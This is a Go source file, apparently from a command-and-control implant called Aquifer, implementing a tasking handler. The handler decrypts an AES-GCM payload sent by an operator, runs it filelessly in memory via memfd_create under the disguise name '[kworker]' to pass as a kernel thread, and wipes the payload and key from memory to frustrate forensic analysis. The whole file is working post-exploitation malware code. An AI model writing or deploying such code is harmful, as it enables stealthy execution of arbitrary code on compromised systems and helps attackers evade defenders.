package tasking

import (
	"encoding/base64"
	"fmt"
	"strings"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/c2"
	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
	"github.com/Real-Fruit-Snacks/Aquifer/pkg/opsec"
)

// StagePayload receives an encrypted payload, decrypts it with AES-GCM,
// and executes it via memfd_create for fileless execution.
// Required args: "payload" (base64-encoded encrypted data), "key" (base64 AES key).
// Optional args: "args" (space-separated arguments for the staged binary),
// "name" (memfd display name, default "[kworker]").
func StagePayload(task config.Task) ([]byte, error) {
	payloadB64, ok := task.Args["payload"]
	if !ok || payloadB64 == "" {
		return nil, fmt.Errorf("stage: missing 'payload' argument")
	}

	keyB64, ok := task.Args["key"]
	if !ok || keyB64 == "" {
		return nil, fmt.Errorf("stage: missing 'key' argument")
	}

	// Decode base64 inputs.
	encPayload, err := base64.StdEncoding.DecodeString(payloadB64)
	if err != nil {
		return nil, fmt.Errorf("stage: payload base64 decode failed: %w", err)
	}

	key, err := base64.StdEncoding.DecodeString(keyB64)
	if err != nil {
		return nil, fmt.Errorf("stage: key base64 decode failed: %w", err)
	}

	// Validate AES key length (AES-256 only).
	switch len(key) {
	case 32:
		// valid
	default:
		return nil, fmt.Errorf("stage: invalid AES key length: %d (need 32)", len(key))
	}

	// Decrypt payload with AES-GCM.
	payload, err := c2.DecryptAESGCM(encPayload, key)

	// Shred ciphertext and base64 intermediates immediately after decryption
	// so they do not linger in memory regardless of success or failure.
	for i := range encPayload {
		encPayload[i] = 0
	}
	encPayload = nil
	// payloadB64 is an immutable string; overwrite the args map entry to
	// drop the reference so the GC can collect the backing array sooner.
	task.Args["payload"] = ""
	task.Args["key"] = ""

	if err != nil {
		for i := range key {
			key[i] = 0
		}
		return nil, fmt.Errorf("stage: decryption failed: %w", err)
	}

	// Parse arguments for the staged binary.
	var execArgs []string
	name := "[kworker]"
	if n, ok := task.Args["name"]; ok && n != "" {
		name = n
	}
	execArgs = append(execArgs, name)

	if argsStr, ok := task.Args["args"]; ok && argsStr != "" {
		execArgs = append(execArgs, strings.Fields(argsStr)...)
	}

	// Execute via memfd (nil envv inherits current environment).
	if err := opsec.MemfdExec(payload, execArgs, nil); err != nil {
		// Shred decrypted material before returning on error.
		for i := range payload {
			payload[i] = 0
		}
		for i := range key {
			key[i] = 0
		}
		return nil, fmt.Errorf("stage: memfd exec failed: %w", err)
	}

	// Save size before shredding (zeroing does not change len(), but
	// capturing it here makes intent explicit for maintainers).
	payloadSize := len(payload)

	// Shred decrypted payload and key from memory now that they have been
	// written to the memfd and are no longer needed.
	for i := range payload {
		payload[i] = 0
	}
	for i := range key {
		key[i] = 0
	}

	return []byte(fmt.Sprintf("staged payload (%d bytes) executing as '%s'", payloadSize, name)), nil
}
